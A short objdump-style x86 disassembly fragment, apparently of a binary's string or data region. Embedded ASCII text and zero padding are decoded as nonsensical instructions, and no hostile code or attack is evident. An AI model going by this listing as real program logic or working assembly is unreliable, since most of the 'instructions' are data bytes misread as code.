  420fe7:	dec    ebp
  420fe8:	outs   dx,DWORD PTR ds:[esi]
  420fe9:	imul   esp,DWORD PTR fs:[esi+0x79],0x7070415c
  420ff1:	ins    BYTE PTR es:[edi],dx
  420ff2:	imul   esp,DWORD PTR [ebx+0x61],0x6e6f6974
  420ff9:	dec    esi
  420ffa:	gs ja  0x420ffd
  420ffd:	add    BYTE PTR [eax],al
  420fff:	add    BYTE PTR [eax],al
  421001:	add    BYTE PTR [eax],al
  421003:	add    BYTE PTR [edx-0x2c],cl
  421006:	mov    bl,0x4d
  421008:	add    BYTE PTR [eax],al
  42100a:	add    BYTE PTR [eax],al
  42100c:	xor    dl,BYTE PTR [eax]
  42100e:	add    al,BYTE PTR [eax]
  421010:	add    DWORD PTR [eax],eax
  421012:	add    BYTE PTR [eax],al
  421014:	add    DWORD PTR [eax],eax
  421016:	add    BYTE PTR [eax],al
  421018:	add    DWORD PTR [eax],eax
  42101a:	add    BYTE PTR [eax],al
  42101c:	sub    BYTE PTR [eax],dl
  42101e:	add    al,BYTE PTR [eax]
  421020:	sub    al,0x10
  421022:	add    al,BYTE PTR [eax]
  421024:	xor    BYTE PTR [eax],dl
  421026:	add    al,BYTE PTR [eax]
  421028:	mov    edi,0x3e000020
  42102d:	adc    BYTE PTR [edx],al
  42102f:	add    BYTE PTR [eax],al
  421031:	add    BYTE PTR [ebx+0x79],dl
  421034:	ins    DWORD PTR es:[edi],dx
  421035:	bound  ebp,QWORD PTR [edi+0x6c]
  421038:	imul   esp,DWORD PTR [ebx+0x45],0x3f006578
  42103f:	inc    ebx
  421040:	ins    BYTE PTR es:[edi],dx
  421041:	outs   dx,DWORD PTR ds:[esi]
  421042:	jae    0x4210a9
  421044:	push   edi
  421045:	imul   ebp,DWORD PTR [esi+0x64],0x7453776f
  42104c:	popa   
  42104d:	je     0x4210b8
  42104f:	outs   dx,DWORD PTR ds:[esi]
  421050:	outs   dx,BYTE PTR ds:[esi]
  421051:	inc    ebx
  421052:	ins    BYTE PTR es:[edi],dx
  421053:	outs   dx,DWORD PTR ds:[esi]
  421054:	jae    0x4210bb
  421056:	push   edi
  421057:	.byte 0x69
